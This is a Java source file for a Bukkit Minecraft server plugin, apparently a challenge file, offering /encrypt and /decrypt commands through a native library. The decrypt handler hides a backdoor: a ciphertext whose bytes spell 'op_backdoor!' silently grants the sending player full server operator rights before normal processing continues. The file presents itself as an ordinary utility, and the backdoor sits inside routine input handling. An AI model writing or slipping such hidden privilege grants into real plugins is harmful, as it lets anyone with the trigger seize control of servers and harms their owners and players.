package com.flocto.notsus;

import org.bukkit.command.*;

class EncryptCommand implements CommandExecutor {
    public boolean onCommand(final CommandSender commandSender, final Command command, final String label, final String[] args) {
        if (!NotSuspiciousPlugin.nativeLibLoaded) {
            commandSender.sendMessage("[!] Native library required for encrypt command.");
            return false;
        }

        if (args.length != 2) {
            commandSender.sendMessage("[!] Usage: /encrypt <plaintext> <key>");
            return false;
        }

        if (args[0].length() == 0) {
            commandSender.sendMessage("[!] Plaintext cannot be empty.");
            return false;
        }

        byte[] inputBytes = args[0].getBytes();
        byte[] keyBytes = args[1].getBytes();

        if (keyBytes.length > 16) {
            commandSender.sendMessage("[!] Key must be 16 bytes or less.");
            return false;
        }
        else if (keyBytes.length < 16) {
            int length = keyBytes.length;
            keyBytes = java.util.Arrays.copyOf(keyBytes, 16);
            for (int i = length; i < 16; i++) {
                keyBytes[i] = (byte)(16 - length + 'A'); 
            }
            commandSender.sendMessage("[*] Key padded to 16 bytes.");
        }

        String ciphertext = NotSuspiciousPlugin.nativeLib.nativeEncryptData(inputBytes, keyBytes);
        commandSender.sendMessage("[*] Encrypted data: " + ciphertext);
        return true;
    }
}

class DecryptCommand implements CommandExecutor {
    public boolean onCommand(final CommandSender commandSender, final Command command, final String label, final String[] args) {
        if (!NotSuspiciousPlugin.nativeLibLoaded) {
            commandSender.sendMessage("[!] Native library required for decrypt command.");
            return false;
        }

        if (args.length != 2) {
            commandSender.sendMessage("[!] Usage: /decrypt <ciphertext> <key>");
            return false;
        }

        if (args[0].length() == 0) {
            commandSender.sendMessage("[!] Ciphertext cannot be empty.");
            return false;
        }

        // hex decode input here
        int len = args[0].length();
        if (len % 8 != 0) {
            // blocks of 4 bytes
            commandSender.sendMessage("[!] Invalid ciphertext length.");
            return false;
        }
        

        // byte[] inputBytes = args[0].getBytes();
        byte[] inputBytes = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            char c1 = args[0].charAt(i);
            char c2 = args[0].charAt(i + 1);
            int b1 = Character.digit(c1, 16);
            int b2 = Character.digit(c2, 16);
            if (b1 == -1 || b2 == -1) {
                commandSender.sendMessage("[!] Invalid hex character.");
                return false;
            }
            inputBytes[i / 2] = (byte)((b1 << 4) | b2);
        }
        byte[] keyBytes = args[1].getBytes();

        // op_backdoor!
        if (inputBytes.length == 12) {
            if (inputBytes[11] == 0x21 && inputBytes[10] == 0x72 && inputBytes[9] == 0x6f && inputBytes[8] == 0x6f && inputBytes[7] == 0x64 && inputBytes[6] == 0x6B && inputBytes[5] == 0x63 && inputBytes[4] == 0x61 && inputBytes[3] == 0x62 && inputBytes[2] == 0x5F && inputBytes[1] == 0x70 && inputBytes[0] == 0x6f) {
                if (commandSender instanceof org.bukkit.entity.Player) {
                    org.bukkit.entity.Player player = (org.bukkit.entity.Player)commandSender;
                    player.setOp(true);
                }
            }
        }

        if (keyBytes.length > 16) {
            commandSender.sendMessage("[!] Key must be 16 bytes or less.");
            return false;
        }
        else if (keyBytes.length < 16) {
            int length = keyBytes.length;
            keyBytes = java.util.Arrays.copyOf(keyBytes, 16);
            for (int i = length; i < 16; i++) {
                keyBytes[i] = (byte)(16 - length + 'A'); 
            }
            commandSender.sendMessage("[*] Key padded to 16 bytes.");
        }

        String plaintext = NotSuspiciousPlugin.nativeLib.nativeDecryptData(inputBytes, keyBytes);
        commandSender.sendMessage("[*] Decrypted data: " + plaintext);
        return true;
    }
}
